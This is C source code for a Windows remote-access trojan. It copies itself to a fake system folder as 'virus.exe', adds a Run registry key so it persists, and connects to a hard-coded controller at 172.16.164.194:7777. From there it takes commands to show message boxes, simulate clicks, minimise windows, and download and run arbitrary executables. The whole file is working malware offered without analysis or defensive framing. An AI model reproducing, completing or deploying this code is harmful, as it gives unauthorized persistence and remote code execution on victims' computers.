#include <ws2tcpip.h> 
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

STARTUPINFO startupinfo = {sizeof(STARTUPINFO),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
PROCESS_INFORMATION process_info = {0,0,0,0};

WSADATA data;
SOCKET sock;
SOCKADDR_IN adres;

int i;

char path[100];
long size = 100;
HKEY hkey;

char welkom[] = "connected\n";
char command[40];
char name[40];
char filter[3];
char regname[] = "myapp";

char fsize[4];

INPUT inp;
OFSTRUCT ofstruct;

void window(HWND win,LPARAM lparam){
	GetWindowTextA(win,name,40);
	if(filter[0] == name[0] && filter[1] == name[1] && filter[2] == name[2]){
		CloseWindow(win);
	}
	return;
}

_stdcall WinMain(
	HINSTANCE hInstance,
	HINSTANCE previnstance,
	LPTSTR cmdline,
	int cmdshow)
{
	CreateDirectoryA("C:\\Windows32",0);
	HANDLE file1 = CreateFileA("C:\\Windows32\\virus.exe",GENERIC_WRITE,0,0,CREATE_NEW,FILE_ATTRIBUTE_NORMAL,0);
	if(!GetLastError()){
		HANDLE file2 = CreateFileA("test.exe",GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
		int fsize = GetFileSize(file2,0);
		char *buf = malloc(fsize);
		ReadFile(file2,buf,fsize,0,0);
		WriteFile(file1,buf,fsize,0,0);
		CloseHandle(file2);
		CloseHandle(file1);
		CreateProcess("C:\\Windows32\\virus.exe",0,0,0,0,0x00000010,0,0,&startupinfo,&process_info);
		free(buf);
		ExitProcess(0);
	}
	else{
		CloseHandle(file1);
		HANDLE name = GetCurrentProcess();
		QueryFullProcessImageNameA(name,0,path,&size);
		RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
		regname[0] = GetTickCount() | 0x80;
		regname[1] = (GetTickCount() << 8) | 0x80;
		RegSetValueExA(hkey,regname,0,REG_SZ,path,100);
	}
	WORD ver = MAKEWORD(2,2);
	WSAStartup(ver, &data);
try_again:
	sock = socket(AF_INET,SOCK_STREAM,0);
 	adres.sin_family = AF_INET;
	adres.sin_port = htons(7777);
	inet_pton(AF_INET,"172.16.164.194",&adres.sin_addr);
	while(connect(sock,(SOCKADDR*)&adres,sizeof(adres))){}
	send(sock,welkom,sizeof(welkom),0);
	for(;;){
		if(recv(sock,command,sizeof(command),0) == -1){goto try_again;};
		switch(command[0]){
		case 'g':
			MessageBox(0,command+2,"error",0);
			break;
		case 'c':
			inp.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
			SendInput(1,&inp,sizeof(inp));
			Sleep(10);
			inp.mi.dwFlags = MOUSEEVENTF_LEFTUP;
			SendInput(1,&inp,sizeof(inp));
			break;
		case 'e':
			recv(sock,fsize,4,0);
			int sz = fsize[0] + (fsize[1] << 8) + (fsize[2] << 16) + (fsize[3] << 24);
			char *exe = malloc(sz);
			int bytesr = 0;
			while(sz > bytesr){
				bytesr += recv(sock,exe + bytesr,size,0);
			}
			HANDLE file = CreateFile("dest.exe",GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
			WriteFile(file,exe,sz,0,0);
			CloseHandle(file);
			CreateProcess("dest.exe",0,0,0,0,0x00000010,0,0,&startupinfo,&process_info);
			break;
		case 's':
			memcpy(filter,command+2,3);
			EnumWindows(&window,0);
			break;
		}
		Sleep(1000);
	}
}
